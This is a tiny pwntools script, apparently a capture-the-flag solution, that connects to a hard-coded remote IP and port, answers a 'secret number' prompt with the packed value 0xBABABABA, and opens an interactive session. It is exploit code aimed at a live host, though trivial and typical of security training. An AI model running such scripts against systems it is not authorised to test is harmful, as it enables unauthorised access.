from pwn import *

io=remote("35.221.144.41",10003)
num=0xBABABABA
payload=p32(num)
io.sendlineafter("Tell me your secret number:\n",payload)
io.interactive()